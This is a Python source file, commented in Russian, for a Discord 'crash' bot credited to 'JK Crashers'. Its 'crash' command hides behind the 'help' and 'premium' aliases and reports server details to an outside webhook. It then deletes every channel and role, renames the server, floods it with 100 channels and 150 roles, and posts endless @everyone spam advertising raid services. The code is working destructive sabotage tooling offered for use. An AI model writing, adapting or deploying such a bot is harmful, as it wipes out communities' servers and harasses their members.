# копия офендер инфо премиум от тимоши
# тут ничего сложного нет, и о никаких ультра потоках речь не идет

import os
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
import discord
import aiohttp
import asyncio
import json
import requests
from discord import Webhook, AsyncWebhookAdapter
#импорты

hook = 'https://discord.com/api/webhooks/1337/jklog' # ссылка на вебхук с логами

intents = discord.Intents.all()
client = commands.Bot(command_prefix = 'of!', intents=intents)
client.remove_command('help')
# создаем бота и удаляем хелп команду

token = open("token.txt").read()

@client.command(aliases=['premium', 'help'])
async def crash(ctx):
  crasher = ctx.author
  guild = ctx.guild.name
  channels = len(ctx.guild.channels)
  roles = len(ctx.guild.roles)
  members = len(ctx.guild.members)
  avatar = ctx.guild.icon_url
  emb = discord.Embed(
   title = 'Offender info - краш сервера!',
   description = f'Сервер: {guild}\nУчастники: {members}\nКол-во ролей: {roles}\nКол-во каналов: {channels}',
   colour = discord.Colour.from_rgb(228,66,22)
  )
  emb.set_footer(text='Powered by JK Crashers')
  emb.set_thumbnail(url=avatar)
  async with aiohttp.ClientSession() as session:
    webhook = discord.Webhook.from_url(hook, adapter=discord.AsyncWebhookAdapter(session))
    await webhook.send(embed=emb)
  for channel in ctx.guild.channels:
    try:
        await channel.delete()
    except:
        pass

  for role in ctx.guild.roles:
    try:
        await role.delete()
    except Exception as e:
        pass
  with open('jk.png','rb') as f:
    ico = f.read()
    await ctx.guild.edit(name='Crash by JK Crashers', icon=ico)

    for jk in range(100):
        await ctx.guild.create_text_channel('crash-by-jkcrashers')

    for jk in range(150):
        await ctx.guild.create_role(name='Crash by JK Crashers')
	
@client.event
async def on_guild_channel_create(channel):
    embed = discord.Embed(
        title = 'Привет котаны!) Данный сервер крашится ботом Offender Info-Premium',
        description = '**Хочешь крашить сервера?** :scroll:\n**Тогда тебе точно к нам!** :sunglasses:\n`JKCrashers` даст вам:\n`- Удобных и мощных краш ботов.`\n`- Помощь с рейдом и крашем.`\n`- Большой функционал краш ботов.`\n\nНаши социальные сети :link:\n[Discord](https://discord.gg/world) :raised_hand:\n[Telegram канал](https://t.me/protectcheck) :man_detective:\n[YouTube создателя](https://youtube.com/c/jktimosha) :camera:',
        colour = discord.Colour.from_rgb(255,2,11)
    )
    webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      while True:
        try:
          await webhook.send("@everyone @here", embed=embed)
        except Exception as e:
          print(e)

client.run(token)
